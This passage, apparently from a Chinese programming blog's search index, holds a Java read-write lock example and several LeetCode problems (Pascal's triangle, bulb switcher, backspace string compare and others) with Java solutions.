(<span class="keyword">true</span>) &#123;</span><br><span class="line">				<span class="keyword">char</span>[] readBuf = data.read();</span><br><span class="line">				System.out.println(Thread.currentThread().getName()+ <span class="string">" reads "</span> + String.valueOf(readBuf));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ReadWriteLock类"><a href="#ReadWriteLock类" class="headerlink" title="ReadWriteLock类"></a>ReadWriteLock类</h3><p>该类提供了用于读取的锁和用于写入的锁。<br>为了确保安全性，我们必须放置如下两种冲突。</p>
<ul>
<li>“读取”和“写入”冲突</li>
<li>“写入”和“写入”冲突</li>
</ul>
<p>由于不存在“读取”和“读取”冲突，所以我们无需对其进行考虑。<br>为了防止发生冲突，需要考虑下面四种情况：<br><strong>当线程想要获取用于读取的锁时……</strong></p>
<ol>
<li>如果有线程正在执行写入，则等待。</li>
<li>如果有线程正在执行读取，则无需等待</li>
</ol>
<p><strong>当线程想要获取想要写入的锁时……</strong><br>3. 如果有线程正在执行写入，则等待<br>4. 如果有线程正在执行读取，则等待</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadWriteLock</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> readingReaders = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> waitingWriters = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> writingWriters = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">boolean</span> preferWriter = <span class="keyword">true</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">readLock</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (writingWriters &gt; <span class="number">0</span> || (preferWriter &amp;&amp; waitingWriters &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">			wait();</span><br><span class="line">		&#125;</span><br><span class="line">		readingReaders++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">readUnlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		readingReaders--;</span><br><span class="line">		preferWriter = <span class="keyword">true</span>;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">writeLock</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		waitingWriters++;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (readingReaders &gt; <span class="number">0</span> || writingWriters &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				wait();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			waitingWriters--;</span><br><span class="line">		&#125;</span><br><span class="line">		writingWriters++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">writeUnlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		writingWriters--;</span><br><span class="line">		preferWriter = <span class="keyword">false</span>;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Read-Write Lock 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>118. 杨辉三角</title>
    <url>/2018/09/05/LeetCode/leetcode-000118.%20%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非负整数 numRows，生成杨辉三角的前 numRows 行。</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000118-yanghuisanjiao.gif" alt="杨辉三角形"></p>
<p>在杨辉三角中，每个数是它左上方和右上方的数的和。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出:</span><br><span class="line">[</span><br><span class="line">     [1],</span><br><span class="line">    [1,1],</span><br><span class="line">   [1,2,1],</span><br><span class="line">  [1,3,3,1],</span><br><span class="line"> [1,4,6,4,1]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>第一行固定是1，那么就可以根据三角形的规律，求出N行来</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; generate(<span class="keyword">int</span> numRows) &#123;</span><br><span class="line">		List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == numRows) &#123;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br><span class="line">		List&lt;Integer&gt; one = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		one.add(<span class="number">1</span>);</span><br><span class="line">		result.add(one);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">			List&lt;Integer&gt; last = result.get(i - <span class="number">1</span>);</span><br><span class="line">			List&lt;Integer&gt; tmp = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">			tmp.add(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++) &#123;</span><br><span class="line">				tmp.add(last.get(j - <span class="number">1</span>) + last.get(j));</span><br><span class="line">			&#125;</span><br><span class="line">			tmp.add(<span class="number">1</span>);</span><br><span class="line">			result.add(tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>232. 用栈实现队列</title>
    <url>/2018/09/05/LeetCode/leetcode-000232.%20%E7%94%A8%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>使用栈实现队列的下列操作：</p>
<ul>
<li>push(x) – 将一个元素放入队列的尾部。</li>
<li>pop() – 从队列首部移除元素。</li>
<li>peek() – 返回队列首部的元素。</li>
<li>empty() – 返回队列是否为空。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MyQueue queue &#x3D; new MyQueue();</span><br><span class="line"></span><br><span class="line">queue.push(1);</span><br><span class="line">queue.push(2);  </span><br><span class="line">queue.peek();  &#x2F;&#x2F; 返回 1</span><br><span class="line">queue.pop();   &#x2F;&#x2F; 返回 1</span><br><span class="line">queue.empty(); &#x2F;&#x2F; 返回 false</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<ul>
<li>你只能使用标准的栈操作 – 也就是只有 push to top, peek/pop from top, size, 和 is empty 操作是合法的。</li>
<li>你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。</li>
<li>假设所有操作都是有效的 （例如，一个空的队列不会调用 pop 或者 peek 操作）。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>使用两个栈来模拟一个队列</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>319. 灯泡开关</title>
    <url>/2018/09/05/LeetCode/leetcode-000319.%20%E7%81%AF%E6%B3%A1%E5%BC%80%E5%85%B3/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>初始时有 n 个灯泡关闭。 第 1 轮，你打开所有的灯泡。 第 2 轮，每两个灯泡你关闭一次。 第 3 轮，每三个灯泡切换一次开关（如果关闭则开启，如果开启则关闭）。第 i 轮，每 i 个灯泡切换一次开关。 对于第 n 轮，你只切换最后一个灯泡的开关。 找出 n 轮后有多少个亮着的灯泡。<br><strong>示例:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 3</span><br><span class="line">输出: 1 </span><br><span class="line">解释: </span><br><span class="line">初始时, 灯泡状态 [关闭, 关闭, 关闭].</span><br><span class="line">第一轮后, 灯泡状态 [开启, 开启, 开启].</span><br><span class="line">第二轮后, 灯泡状态 [开启, 关闭, 开启].</span><br><span class="line">第三轮后, 灯泡状态 [开启, 关闭, 关闭]. </span><br><span class="line"></span><br><span class="line">你应该返回 1，因为只有一个灯泡还亮着。</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><a href="https://blog.csdn.net/qqzj_bupt/article/details/53355362" target="_blank" rel="noopener">https://blog.csdn.net/qqzj_bupt/article/details/53355362</a></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bulbSwitch</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(Math.sqrt(n));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>521. 最长特殊序列 Ⅰ</title>
    <url>/2018/09/05/LeetCode/leetcode-000521.%20%E6%9C%80%E9%95%BF%E7%89%B9%E6%AE%8A%E5%BA%8F%E5%88%97%20%E2%85%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个字符串，你需要从这两个字符串中找出最长的特殊序列。最长特殊序列定义如下：该序列为某字符串独有的最长子序列（即不能是其他字符串的子序列）。</p>
<p>子序列可以通过删去字符串中的某些字符实现，但不能改变剩余字符的相对顺序。空序列为所有字符串的子序列，任何字符串为其自身的子序列。</p>
<p>输入为两个字符串，输出最长特殊序列的长度。如果不存在，则返回 -1。<br><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;aba&quot;, &quot;cdc&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解析: 最长特殊序列可为 &quot;aba&quot; (或 &quot;cdc&quot;)</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>两个字符串长度均小于100。</li>
<li>字符串中的字符仅含有 ‘a’~’z’。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>如果两个字符串长度不相同，A字符串大于B字符串，则A字符串不能通过B字符串删除某些字符得到，那么最长特殊序列的长度就是A的长度。<br>如果两个字符串相等的话，分两种情况：</p>
<ol>
<li>两个字符串相等，那么就没有最长特殊字符序列</li>
<li>两个字符串不相等，那么任意字符串的长度就是最长特殊字符序列<br>###<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findLUSlength</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> la = a.length();</span><br><span class="line">    <span class="keyword">int</span> lb = b.length();</span><br><span class="line">    <span class="keyword">if</span> (la != lb) &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.max(la, lb);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a.equals(b)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> la;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>535. TinyURL 的加密与解密</title>
    <url>/2018/09/05/LeetCode/leetcode-000535.%20TinyURL%20%E7%9A%84%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>TinyURL是一种URL简化服务， 比如：当你输入一个URL <code>https://leetcode.com/problems/design-tinyurl</code> 时，它将返回一个简化的URL <code>http://tinyurl.com/4e9iAk</code>.</p>
<p>要求：设计一个 TinyURL 的加密 <code>encode</code> 和解密 <code>decode</code> 的方法。你的加密和解密算法如何设计和运作是没有限制的，你只需要保证一个URL可以被加密成一个TinyURL，并且这个TinyURL可以用解密方法恢复成原本的URL。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>使用hashcode()</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;Integer, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">	<span class="comment">// Encodes a URL to a shortened URL.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">encode</span><span class="params">(String longUrl)</span> </span>&#123;</span><br><span class="line">        map.put(longUrl.hashCode(), longUrl);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"http://tinyurl.com/"</span> + longUrl.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decodes a shortened URL to its original URL.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">decode</span><span class="params">(String shortUrl)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> map.get(Integer.parseInt(shortUrl.replace(<span class="string">"http://tinyurl.com/"</span>, <span class="string">""</span>)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>551. 学生出勤纪录 I</title>
    <url>/2018/09/05/LeetCode/leetcode-000551.%20%E5%AD%A6%E7%94%9F%E5%87%BA%E5%8B%A4%E7%BA%AA%E5%BD%95%20I/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串来代表一个学生的出勤纪录，这个纪录仅包含以下三个字符：</p>
<ol>
<li>‘<code>A</code>‘ : Absent，缺勤</li>
<li>‘<code>L</code>‘ : Late，迟到</li>
<li>‘<code>P</code>‘ : Present，到场</li>
</ol>
<p>如果一个学生的出勤纪录中不超过一个’A’(缺勤)并且不超过两个连续的’L’(迟到),那么这个学生会被奖赏。</p>
<p>你需要根据这个学生的出勤纪录判断他是否会被奖赏。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;PPALLP&quot;</span><br><span class="line">输出: True</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;PPALLL&quot;</span><br><span class="line">输出: False</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>判断是否同时有一个A并且和连续的三个A就行</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkRecord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">long</span> aNum = s.chars().filter(c -&gt; c == <span class="string">'A'</span>).count();</span><br><span class="line">		<span class="keyword">if</span> ((aNum &lt;= <span class="number">1</span>) &amp;&amp; (!s.contains(<span class="string">"LLL"</span>))) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>672. 灯泡开关 Ⅱ</title>
    <url>/2018/09/05/LeetCode/leetcode-000672.%20%E7%81%AF%E6%B3%A1%E5%BC%80%E5%85%B3%20%E2%85%A1/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>现有一个房间，墙上挂有 n 只已经打开的灯泡和 4 个按钮。在进行了 m 次未知操作后，你需要返回这 n 只灯泡可能有多少种不同的状态。</p>
<p>假设这 n 只灯泡被编号为 [1, 2, 3 …, n]，这 4 个按钮的功能如下：</p>
<ol>
<li>将所有灯泡的状态反转（即开变为关，关变为开）</li>
<li>将编号为偶数的灯泡的状态反转</li>
<li>将编号为奇数的灯泡的状态反转</li>
<li>将编号为 3k+1 的灯泡的状态反转（k = 0, 1, 2, …)</li>
</ol>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 1, m &#x3D; 1.</span><br><span class="line">输出: 2</span><br><span class="line">说明: 状态为: [开], [关]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 2, m &#x3D; 1.</span><br><span class="line">输出: 3</span><br><span class="line">说明: 状态为: [开, 关], [关, 开], [关, 关]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 3, m &#x3D; 1.</span><br><span class="line">输出: 4</span><br><span class="line">说明: 状态为: [关, 开, 关], [开, 关, 开], [关, 关, 关], [关, 开, 开].</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong><code>n</code> 和 <code>m</code> 都属于 [0, 1000].</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><a href="https://blog.csdn.net/huanghanqian/article/details/77857912" target="_blank" rel="noopener">https://blog.csdn.net/huanghanqian/article/details/77857912</a></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">flipLights</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">2</span>&amp;&amp;m==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span>(m&gt;=<span class="number">3</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>844. 比较含退格的字符串</title>
    <url>/2018/09/05/LeetCode/leetcode-000844.%20%E6%AF%94%E8%BE%83%E5%90%AB%E9%80%80%E6%A0%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定 S 和 T 两个字符串，当它们分别被输入到空白的文本编辑器后，判断二者是否相等，并返回结果。 # 代表退格字符。</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：S &#x3D; &quot;ab#c&quot;, T &#x3D; &quot;ad#c&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：S 和 T 都会变成 “ac”。</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：S &#x3D; &quot;ab##&quot;, T &#x3D; &quot;c#d#&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：S 和 T 都会变成 “”。</span><br></pre></td></tr></table></figure>
<h3 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：S &#x3D; &quot;a##c&quot;, T &#x3D; &quot;#a#c&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：S 和 T 都会变成 “c”。</span><br></pre></td></tr></table></figure>
<h3 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：S &#x3D; &quot;a#c&quot;, T &#x3D; &quot;b&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：S 会变成 “c”，但 T 仍然是 “b”。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li>1 &lt;= S.length &lt;= 200</li>
<li>1 &lt;= T.length &lt;= 200</li>
<li>S 和 T 只含有小写字母以及字符 ‘#’。<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>使用栈，先入栈，碰到<code>#</code>就出栈</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">backspaceCompare</span><span class="params">(String S, String T)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getRealString(S).equals(getRealString(T));</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">getRealString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		Stack&lt;Character&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">			<span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">			<span class="keyword">if</span> (c == <span class="string">'#'</span> &amp;&amp; !stack.isEmpty()) &#123;</span><br><span class="line">				stack.pop();</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c != <span class="string">'#'</span>) &#123;</span><br><span class="line">				stack.push(c);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		<span class="keyword">while</span>(!stack.isEmpty()) &#123;</span><br><span class="line">			sb.append(stack.pop());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>从字符串的尾部开始遍历，统计遇到的<code>#</code>符号个数记为count，当下一个字符不是#的时候，从该字符开始计算，跳过count个字符。当count为0，并且当前字符不为<code>#</code>时，才算作有效字符。</p>
<p>比如字符串123##22</p>
<p>当从字符串末尾开始遍历的时候，遇到了两个<code>#</code>，此时count为2，那么代表它要跳过两个字符，在跳过的同时，count自减。因此，当字符<code>1</code>的时候，count为0，那么<code>1</code>就是有效字符</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">backspaceCompare</span><span class="params">(String S, String T)</span> </span>&#123;</span><br><span class="line">		String s = getValidString(S);</span><br><span class="line">		String t = getValidString(T);</span><br><span class="line">		<span class="keyword">return</span> s.equals(t);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">getValidString</span><span class="params">(String S)</span> </span>&#123;</span><br><span class="line">		StringBuilder s = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = S.length() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">			<span class="keyword">if</span> (S.charAt(i) == <span class="string">'#'</span>) &#123;</span><br><span class="line">				count++;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				count--;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				s.append(S.charAt(i));</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> s.toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>896. 单调数列</title>
    <url>/2018/09/05/LeetCode/leetcode-000896.%20%E5%8D%95%E8%B0%83%E6%95%B0%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>如果数组是单调递增或单调递减的，那么它是单调的。</p>
<p>如果对于所有 i &lt;= j，A[i] &lt;= A[j]，那么数组 A 是单调递增的。 如果对于所有 i &lt;= j，A[i]&gt; = A[j]，那么数组 A 是单调递减的。</p>
<p>当给定的数组 A 是单调数组时返回 true，否则返回 false。</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,2,3]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,2,3]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<h3 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,3,2]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
<h3 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,4,5]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
